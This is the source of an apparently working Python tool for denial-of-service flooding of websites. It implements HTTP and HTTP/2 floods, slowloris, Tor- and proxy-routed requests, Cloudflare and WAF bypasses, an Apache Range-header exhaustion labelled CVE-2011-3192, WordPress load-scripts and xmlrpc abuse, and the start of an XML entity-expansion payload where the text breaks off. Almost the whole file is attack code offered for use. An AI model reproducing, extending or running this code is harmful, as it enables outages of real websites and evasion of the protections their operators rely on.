from argparse import ArgumentParser
from asyncio import (Lock, run, Event, create_task, sleep,
                     StreamReader, StreamWriter, wait_for, open_connection)
from enum import Enum, auto as auto_enum
from itertools import count
from os import urandom
from pathlib import Path
from random import choice, randrange
from re import compile, I
from ssl import CERT_NONE, SSLContext, create_default_context
from time import perf_counter
from typing import Dict, Tuple
from urllib.parse import urlencode, parse_qs

from aiohttp import ClientSession, ClientTimeout
from aiocfscrape import CloudflareScraper
from aiohttp_socks import ChainProxyConnector, ProxyConnector
from certifi import where
from h2.connection import H2Connection
from yarl import URL
from python_socks.async_.asyncio import Proxy
from string import ascii_uppercase, digits
from requests import get
import traceback

ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

class Patterns:
    cookie = compile("set-(cookie:) (.+)(?:\r\n)?", I)


class Counter:
    def __init__(self, value=0, step=1):
        self._read = count()
        self._counter = count(value, step)
        self._lock = Lock()
        self._step = step
        self._start_value = value

    def increment(self, num_steps=1):
        for i in range(0, num_steps):
            next(self._counter)

    def __iadd__(self, value):
        self.increment(value)
        return self

    async def set(self, value):
        async with self._lock:
            self._read = count()
            self._counter = count(value, self._step)

    @property
    async def value(self):
        async with self._lock:
            return next(self._counter) - next(self._read)

    async def reset(self):
        await self.set(self._start_value)


# noinspection PyArgumentList
class HttpRequestType(Enum):
    GET = auto_enum()
    HEAD = auto_enum()
    POST = auto_enum()
    DELETE = auto_enum()
    PURGE = auto_enum()
    PUT = auto_enum()
    PATCH = auto_enum()
    OPTIONS = auto_enum()


class Tools:
    @staticmethod
    def safeClose(reader, writer):
        if writer:
            writer.close()

    @staticmethod
    def encode(data):
        return Tools.random(data).encode()
        
    @staticmethod
    def choiceProxy():
        return choice(MagicData.PROXIES)
        
    @staticmethod
    def choiceRawProxy():
        return choice(MagicData.RAW_PROXIES)
        
    @staticmethod
    def randomDict(data):
        if not data:
            return data
            
        if not isinstance(data, dict):
            return None
                
        newDict = {}
        
        for k,v in data.items():
            newDict[Tools.random(k)] = Tools.random(v)
        
        return newDict
        
    @staticmethod
    def random(data):
        for _ in range(len(data.split("%25RANDOM%25"))):
            data = data.replace("%25RANDOM%25", Tools.randString(16), 1)
        return data
        
    @staticmethod
    def randString(size):
        return ''.join(choice(ascii_uppercase + digits) for _ in range(size))
        

class MethodsFunction:
    @staticmethod
    async def HTTP_EVEN(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()

            attack.cps += 1
            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Connection: keep-alive\r\n"
                                 "%s%s\r\n" % (
                                     attack.request_type.name,
                                     attack.target.raw_path_qs,
                                     attack.target.raw_authority,
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))
            while attack.event.is_set():
                writer.write(payload)
                await writer.drain()
                attack.pps += 1
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def TOR_BYPASS(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection(Proxy.from_url("socks5://127.0.0.1:9050", rdns=True))
            attack.cps += 1

            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Connection: keep-alive\r\n"
                                 "%s%s\r\n" % (
                                     attack.request_type.name,
                                     attack.target.raw_path_qs,
                                     attack.target.raw_authority,
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))
            for _ in range(attack.rpc):
                writer.write(payload)
                await writer.drain()
                attack.pps += 1
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def HTTP_RAW(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1

            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Connection: keep-alive\r\n"
                                 "%s%s\r\n" % (
                                     attack.request_type.name,
                                     attack.target.raw_path_qs,
                                     attack.target.raw_authority,
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))
            for _ in range(attack.rpc):
                writer.write(payload)
                await writer.drain()
                attack.pps += 1
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def WORDPRESS(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1
            
            if choice([True, False]):
                payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                     "Host: %s\r\n"
                                     "Connection: keep-alive\r\n"
                                     "%s%s\r\n" % (
                                         attack.request_type.name,
                                         attack.target.raw_path_qs + choice(MagicData.WORDPRESS_EXPLOITS),
                                         attack.target.raw_authority,
                                         attack.custom_headers,
                                         attack.post_data,
                                     ))

            else:
                payload = Tools.encode("%s /xmlrpc.php HTTP/1.1\r\n"
                                     "Host: %s\r\n"
                                     "Connection: keep-alive\r\n"
                                     "%s%s\r\n" % (
                                         attack.request_type.name,
                                         attack.target.raw_authority,
                                         attack.custom_headers,
                                         MagicData.XMLRPC,
                                     ))
                
            for _ in range(attack.rpc):
                writer.write(payload)
                await writer.drain()
                attack.pps += 1
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def HTTP_SLOW(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1

            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Connection: keep-alive\r\n"
                                 "%s%s\r\n" % (
                                     attack.request_type.name,
                                     attack.target.raw_path_qs,
                                     attack.target.raw_authority,
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))
            for _ in range(attack.rpc):
                writer.write(payload)
                attack.pps += 1

                await writer.drain()

                for _ in range(attack.rpc):
                    writer.write(Tools.encode("X-a: %d\r\n" % randrange(1, 5000)))
                    await writer.drain()
                    attack.pps += 1
                    await sleep(attack.rpc / 15)
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def HTTP2_RAW(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1

            c = H2Connection()
            c.initiate_connection()

            writer.write(c.data_to_send())
            await writer.drain()
            attack.pps += 1

            headers = [
                (':method', attack.request_type.name),
                (':path', attack.target.raw_path_qs),
                (':authority', attack.target.raw_authority),
                (':scheme', attack.target.scheme),
            ]

            for _ in range(attack.rpc):
                c.send_headers(1, headers)
                writer.write(c.data_to_send())
                await writer.drain()
                attack.pps += 1

            c.close_connection()
            writer.write(c.data_to_send())
            await writer.drain()
            attack.pps += 1
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def HTTP2_BYPASS(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1

            c = H2Connection()
            c.initiate_connection()

            writer.write(c.data_to_send())
            await writer.drain()
            attack.pps += 1

            headers = [
                (':method', attack.request_type.name),
                (':path', attack.target.raw_path_qs),
                (':authority', attack.target.raw_authority),
                (':scheme', attack.target.scheme),
                ("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,"
                           "image/avif,image/webp,image/apng,*/*;q=0.8,application"
                           "/signed-exchange;v=b3;q=0.9"),
                ("accept-encoding", "gzip, deflate, br"),
                ("accept-language", "en-US;q=0.6"),
                ("cache-control", "max-age=0"),
                ("sec-fetch-dest", "document"),
                ("sec-fetch-mode", "navigate"),
                ("sec-fetch-site", "same-origin"),
                ("sec-fetch-user", "?1"),
                ("sec-gpc", "1"),
                ("upgrade-insecure-requests", "1"),
                ("user-agent", choice(MagicData.USER_AGENTS))
            ]

            for _ in range(attack.rpc):
                c.send_headers(1, headers)
                writer.write(c.data_to_send())
                await writer.drain()
                attack.pps += 1

            c.close_connection()
            writer.write(c.data_to_send())
            await writer.drain()
            attack.pps += 1
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def HTTP_BYPASS(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1

            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Upgrade-Insecure-Requests: 1\r\n"
                                 "Connection: keep-alive\r\n"
                                 "User-Agent: %s\r\n"
                                 "Accept-Encoding: gzip, deflate, br\r\n"
                                 "Accept-Language: en-US\r\n"
                                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,"
                                 "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
                                 "Sec-GPC: 1\r\n"
                                 "Sec-Fetch-Site: none\r\n"
                                 "Sec-Fetch-Mode: navigate\r\n"
                                 "Sec-Fetch-User: ?1\r\n"
                                 "Sec-Fetch-Dest: document\r\n"
                                 "%s%s\r\n" % (
                                     attack.request_type.name,
                                     attack.target.raw_path_qs,
                                     attack.target.raw_authority,
                                     choice(MagicData.USER_AGENTS),
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))

            for _ in range(attack.rpc):
                writer.write(payload)
                await writer.drain()
                attack.pps += 1
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def HTTP_BYPASSV2(attack):
        proxy = ProxyConnector
        s: ClientSession
        
        agent = choice(MagicData.USER_AGENTS)
        target = Tools.random(attack.target.human_repr())
        
        async with ClientSession(connector=ProxyConnector.from_url(Tools.choiceRawProxy()), timeout=MagicData.TIMEOUT) as s:
            attack.cps += 1
            for _ in range(attack.rpc):
                attack.pps += 1
                await s.request(attack.request_type.name,
                                target,
                                headers={'User-Agent': agent, **Tools.randomDict(attack.raw_custom_header)}, data=Tools.randomDict(attack.raw_post_data))

    @staticmethod
    async def WAF_BYPASS(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1

            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Upgrade-Insecure-Requests: 1\r\n"
                                 "Connection: keep-alive\r\n"
                                 "User-Agent: %s\r\n"
                                 "Accept-Language: en-US\r\n"
                                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,"
                                 "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
                                 "Sec-GPC: 1\r\n"
                                 "Sec-Fetch-Site: none\r\n"
                                 "Sec-Fetch-Mode: navigate\r\n"
                                 "Sec-Fetch-User: ?1\r\n"
                                 "Sec-Fetch-Dest: document\r\n"
                                 "%s"
                                 "%s\r\n" % (
                                     attack.request_type.name,
                                     attack.target.raw_path_qs,
                                     attack.target.raw_authority,
                                     choice(MagicData.USER_AGENTS),
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))
            for _ in range(attack.rpc):
                writer.write(payload)
                await writer.drain()
                attack.pps += 1

                data = (await reader.read(1024)).decode()

                if ": Close\r\n" in data:
                    break

                rep = Patterns.cookie.search(data)

                if not rep:
                    continue

                payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                     "Host: %s\r\n"
                                     "Upgrade-Insecure-Requests: 1\r\n"
                                     "Connection: keep-alive\r\n"
                                     "User-Agent: %s\r\n"
                                     "Accept-Language: en-US\r\n"
                                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,"
                                     "image/avif,image/webp,image/apng,*/*;q=0.8,"
                                     "application/signed-exchange;v=b3;q=0.9\r\n "
                                     "Sec-GPC: 1\r\n"
                                     "Sec-Fetch-Site: none\r\n"
                                     "Sec-Fetch-Mode: navigate\r\n"
                                     "Sec-Fetch-User: ?1\r\n"
                                     "Sec-Fetch-Dest: document\r\n"
                                     "%s"
                                     "%s"
                                     "%s\r\n" % (
                                         attack.request_type.name,
                                         attack.target.raw_path_qs,
                                         attack.target.raw_authority,
                                         choice(MagicData.USER_AGENTS),
                                         attack.custom_headers,
                                         f"Cookie: {rep.group(2)}\r\n",
                                         attack.post_data,
                                     ))
            writer.write(payload.replace(b"Connection: keep-alive", b"Connection: close"))
            await writer.drain()
            attack.pps += 1
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def CF_BYPASS(attack):
        agent = choice(MagicData.USER_AGENTS)
        proxy = Tools.choiceRawProxy()
        
        bypass = False
        
        target = Tools.random(attack.target.human_repr())
        
        async with CloudflareScraper(trust_env=True, connector=ProxyConnector.from_url(proxy, rdns=True), timeout=MagicData.TIMEOUT) as session:
            attack.cps += 1
            attack.pps += 1
                        
            for _ in range(attack.rpc):
                attack.pps += 1
                async with session.request(attack.request_type.name, target, ssl=attack.tls["ctx"], headers={'User-Agent': agent, **Tools.randomDict(attack.raw_custom_header)}, data=Tools.randomDict(attack.raw_post_data)) as resp:
                    if attack.verbose and not bypass:
                        print("%s Bypassed! cookie: %s" % (proxy, resp.cookies or None))
                        bypass = True

        

    @staticmethod
    async def SCATTERED_CLOUD(attack):
        await MethodsFunction.WAF_BYPASS(attack)

    @staticmethod
    async def BYE_SQL(attack):
        await MethodsFunction.HTTP_RAW(attack)

    @staticmethod
    async def APACHE(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1

            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Upgrade-Insecure-Requests: 1\r\n"
                                 "Connection: keep-alive\r\n"
                                 "User-Agent: %s\r\n"
                                 "Accept-Encoding: gzip, deflate, br\r\n"
                                 "Accept-Language: en-US\r\n"
                                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,"
                                 "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
                                 "Sec-GPC: 1\r\n"
                                 "Sec-Fetch-Site: none\r\n"
                                 "Sec-Fetch-Mode: navigate\r\n"
                                 "Range: bytes=0-,%s"
                                 "Sec-Fetch-User: ?1\r\n"
                                 "Sec-Fetch-Dest: document\r\n"
                                 "%s%s\r\n" % (
                                     attack.request_type.name,
                                     attack.target.raw_path_qs,
                                     attack.target.raw_authority,
                                     choice(MagicData.USER_AGENTS),
                                     MagicData.CVE_2011_3192,
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))
            for _ in range(attack.rpc):
                writer.write(payload)
                await writer.drain()
                attack.pps += 1

            await writer.drain()
            attack.pps += 1
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def BROWSER(attack):
        pass

    @staticmethod
    async def HTTP_STOMP(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1
            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Upgrade-Insecure-Requests: 1\r\n"
                                 "Connection: keep-alive\r\n"
                                 "User-Agent: %s\r\n"
                                 "Accept-Encoding: gzip, deflate, br\r\n"
                                 "Accept-Language: en-US\r\n"
                                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,"
                                 "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
                                 "Sec-GPC: 1\r\n"
                                 "Sec-Fetch-Site: none\r\n"
                                 "Sec-Fetch-Mode: navigate\r\n"
                                 "Sec-Fetch-User: ?1\r\n"
                                 "Sec-Fetch-Dest: document\r\n"
                                 "%s%s\r\n" % (
                                     attack.request_type.name,
                                     attack.target.raw_path_qs + MagicData.HEXS,
                                     choice(MagicData.USER_AGENTS),
                                     attack.target.raw_authority,
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))

            payload2 = Tools.encode("%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\n"
                                  "Host: %s\r\n"
                                  "Upgrade-Insecure-Requests: 1\r\n"
                                  "Connection: keep-alive\r\n"
                                  "User-Agent: %s\r\n"
                                  "Accept-Encoding: gzip, deflate, br\r\n"
                                  "Accept-Language: en-US\r\n"
                                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,"
                                  "image/avif,image/webp,image/apng,*/*;q=0.8,"
                                  "application/signed-exchange;v=b3;q=0.9\r\n "
                                  "Sec-GPC: 1\r\n"
                                  "Sec-Fetch-Site: none\r\n"
                                  "Sec-Fetch-Mode: navigate\r\n"
                                  "Sec-Fetch-User: ?1\r\n"
                                  "Sec-Fetch-Dest: document\r\n"
                                  "%s\r\n"
                                  "%s\r\n" % (
                                      attack.request_type.name,
                                      choice(MagicData.USER_AGENTS),
                                      attack.target.raw_authority,
                                      attack.custom_headers,
                                      attack.post_data,
                                  ))

            writer.write(payload)
            await writer.drain()
            attack.pps += 1

            writer.write(payload2)
            await writer.drain()
            attack.pps += 1

            for _ in range(attack.rpc):
                writer.write(payload)
                await writer.drain()
                attack.pps += 1
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def HTTP_DYN(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1

            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Upgrade-Insecure-Requests: 1\r\n"
                                 "Connection: keep-alive\r\n"
                                 "User-Agent: %s\r\n"
                                 "Accept-Encoding: gzip, deflate, br\r\n"
                                 "Accept-Language: en-US\r\n"
                                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,"
                                 "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
                                 "Sec-GPC: 1\r\n"
                                 "Sec-Fetch-Site: none\r\n"
                                 "Sec-Fetch-Mode: navigate\r\n"
                                 "Sec-Fetch-User: ?1\r\n"
                                 "Sec-Fetch-Dest: document\r\n"
                                 "%s%s\r\n" % (
                                     attack.request_type.name,
                                     attack.target.raw_path_qs,
                                     choice(MagicData.USER_AGENTS),
                                     str(randrange(1000, 9999)) + "." + attack.target.raw_authority,
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))
            for _ in range(attack.rpc):
                writer.write(payload)
                await writer.drain()
                attack.pps += 1

        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def HTTP_RHEX(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1

            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Upgrade-Insecure-Requests: 1\r\n"
                                 "Connection: keep-alive\r\n"
                                 "User-Agent: %s\r\n"
                                 "Accept-Encoding: gzip, deflate, br\r\n"
                                 "Accept-Language: en-US\r\n"
                                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,"
                                 "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
                                 "Sec-GPC: 1\r\n"
                                 "Sec-Fetch-Site: none\r\n"
                                 "Sec-Fetch-Mode: navigate\r\n"
                                 "Sec-Fetch-User: ?1\r\n"
                                 "Sec-Fetch-Dest: document\r\n"
                                 "%s%s\r\n" % (
                                     attack.request_type.name,
                                     attack.target.raw_path_qs + str(urandom(choice([32, 64, 128]))),
                                     choice(MagicData.USER_AGENTS),
                                     attack.target.raw_authority,
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))
            for _ in range(attack.rpc):
                writer.write(payload)
                await writer.drain()
                attack.pps += 1

        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def HTTP_NULL(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1

            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Upgrade-Insecure-Requests: 1\r\n"
                                 "Connection: keep-alive\r\n"
                                 "User-Agent: null\r\n"
                                 "Accept-Encoding: null\r\n"
                                 "Accept-Language: null\r\n"
                                 "Accept: null,*\r\n"
                                 "Sec-GPC: null\r\n"
                                 "Sec-Fetch-Site: null\r\n"
                                 "Sec-Fetch-Mode: null\r\n"
                                 "Sec-Fetch-User: null\r\n"
                                 "Sec-Fetch-Dest: null\r\n"
                                 "%s%s\r\n" % (
                                     attack.request_type.name,
                                     attack.target.raw_path_qs,
                                     attack.target.raw_authority,
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))
            for _ in range(attack.rpc):
                writer.write(payload)
                await writer.drain()
                attack.pps += 1
        finally:
            Tools.safeClose(reader, writer)

    @staticmethod
    async def XOVER_FLOW(attack):
        reader, writer = None, None
        try:
            reader, writer = await attack.open_connection()
            attack.cps += 1

            payload = Tools.encode("%s %s HTTP/1.1\r\n"
                                 "Host: %s\r\n"
                                 "Upgrade-Insecure-Requests: 1\r\n"
                                 "Connection: keep-alive\r\n"
                                 "User-Agent: %s\r\n"
                                 "Accept-Encoding: gzip, deflate, br\r\n"
                                 "Accept-Language: en-US\r\n"
                                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,"
                                 "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
                                 "Sec-GPC: 1\r\n"
                                 "Sec-Fetch-Site: none\r\n"
                                 "Sec-Fetch-Mode: navigate\r\n"
                                 "Sec-Fetch-User: ?1\r\n"
                                 "Sec-Fetch-Dest: document\r\n"
                                 "%s%s\r\n" % (
                                     attack.request_type.name,
                                     (attack.target.raw_path_qs + "?" + MagicData.INVALID_ARG)
                                     if "?" not in attack.target.raw_path_qs else
                                     attack.target.raw_path_qs + "&" + MagicData.INVALID_ARG,
                                     choice(MagicData.USER_AGENTS),
                                     attack.target.raw_authority,
                                     attack.custom_headers,
                                     attack.post_data,
                                 ))
            for _ in range(attack.rpc):
                writer.write(payload)
                await writer.drain()
                attack.pps += 1

        finally:
            Tools.safeClose(reader, writer)


# noinspection PyArgumentList
class Methods(Enum):
    HTTP_RAW = MethodsFunction.HTTP_RAW  # raw method
    TOR_BYPASS = MethodsFunction.TOR_BYPASS  # raw method
    HTTP_EVEN = MethodsFunction.HTTP_EVEN  # spam http raw method
    HTTP_SLOW = MethodsFunction.HTTP_SLOW  # slowloris method
    HTTP2_BYPASS = MethodsFunction.HTTP2_BYPASS  # http2 http_bypass method
    HTTP2_RAW = MethodsFunction.HTTP2_RAW  # http2 raw method
    HTTP_BYPASS = MethodsFunction.HTTP_BYPASS  # raw method more headers
    WAF_BYPASS = MethodsFunction.WAF_BYPASS  # raw method more headers follow cookies
    HTTP_BYPASSV2 = MethodsFunction.HTTP_BYPASSV2  # raw method more headers follow cookies
    CF_BYPASS = MethodsFunction.CF_BYPASS  # bypass cloudflare uam
    SCATTERED_CLOUD = MethodsFunction.SCATTERED_CLOUD  # bypass arvan shit cloud
    BYE_SQL = MethodsFunction.BYE_SQL  # down port 3306 using invalid login spam
    APACHE = MethodsFunction.APACHE  # CVE-2011-3192
    WORDPRESS = MethodsFunction.WORDPRESS  # CVE-2011-3192
    BROWSER = MethodsFunction.BROWSER  # bypass cloudflare and other cdn
    HTTP_STOMP = MethodsFunction.HTTP_STOMP  # invalid request location using UTF-16 (Passing captcha if target
    # website send no response)
    HTTP_DYN = MethodsFunction.HTTP_DYN  # randomize Host header to down website (Not working on cloudflare and ip
    # hidden services)
    HTTP_RHEX = MethodsFunction.HTTP_RHEX  # randomize Host header using UTF-16 (Not working on cloudflare and ip
    # hidden services)
    HTTP_NULL = MethodsFunction.HTTP_NULL  # high data flood
    XOVER_FLOW = MethodsFunction.XOVER_FLOW  # send invalid post data & argument, then the target may parse using
    # loops in the main thread


class MagicData:
    RAW_PROXIES = None
    LOCK_PROXIES = Lock()
    PASSED = dict()
    PASSED_LOCK = Lock()
    TIMEOUT = ClientTimeout(5)
    PROXIES = None
    INVALID_ARG = urlencode({str(x): str(randrange(0xFFFFFFFF1024)) for x in range(256)})
    CVE_2011_3192 = ",".join("5-%d" % i for i in range(1, 1024))
    WORDPRESS_EXPLOITS = ["/wp-admin/load-styles.php?&load=common,forms,admin-menu,dashboard,list-tables,edit,rev" \
                          "isions,media,themes,about,nav-menus,widgets,site-icon,l10n,install,wp-color-picker,cus" \
                          "tomize-controls,customize-widgets,customize-nav-menus,customize-preview,ie,login,site-" \
                          "health,buttons,admin-bar,wp-auth-check,editor-buttons,media-views,wp-pointer,wp-jquery" \
                          "-ui-dialog,wp-block-library-theme,wp-edit-blocks,wp-block-editor,wp-block-library,wp-c" \
                          "omponents,wp-edit-post,wp-editor,wp-format-library,wp-list-reusable-blocks,wp-nux,depr" \
                          "ecated-media,farbtastic", 
                          "/wp-admin/load-scripts.php?load=react,react-dom,moment,lodash,wp-polyfill-fetch,wp-pol" \
                          "yfill-formdata,wp-polyfill-node-contains,wp-polyfill-url,wp-polyfill-dom-rect,wp-polyf" \
                          "ill-element-closest,wp-polyfill,wp-block-library,wp-edit-post,wp-i18n,wp-hooks,wp-api-" \
                          "fetch,wp-data,wp-date,editor,colorpicker,media,wplink,link,utils,common,wp-sanitize,sa" \
                          "ck,quicktags,clipboard,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,w" \
                          "p-auth-check,wp-lists,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-" \
                          "effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-eff" \
                          "ects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effect" \
                          "s-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-eff" \
                          "ects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-" \
                          "accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialo" \
                          "g,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-pos" \
                          "ition,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectm" \
                          "enu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-too" \
                          "ltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-" \
                          "object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,mas" \
                          "onry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plu" \
                          "pload,swfupload,swfupload-all,swfupload-handlers,comment-reply,json2,underscore,backbo" \
                          "ne,wp-util,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaele" \
                          "ment-migrate,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,esprima,jshint,j" \
                          "sonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-a" \
                          "sync,password-strength-meter,user-profile,language-chooser,user-suggest,admin-bar,wpli" \
                          "nk,wpdialogs,word-count,media-upload,hoverIntent,hoverintent-js,customize-base,customi" \
                          "ze-loader,customize-preview,customize-models,customize-views,customize-controls,custom" \
                          "ize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus," \
                          "customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embed" \
                          ",media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,x" \
                          "fn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-w" \
                          "idgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-" \
                          "video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,p" \
                          "lugin-install,site-health,privacy-tools,updates,farbtastic,iris,wp-color-picker,dashbo" \
                          "ard,list-revisions,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-head" \
                          "er,custom-background,media-gallery,svg-painter"]
    XMLRPC = """<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE lolz [
     <!ENTITY poc 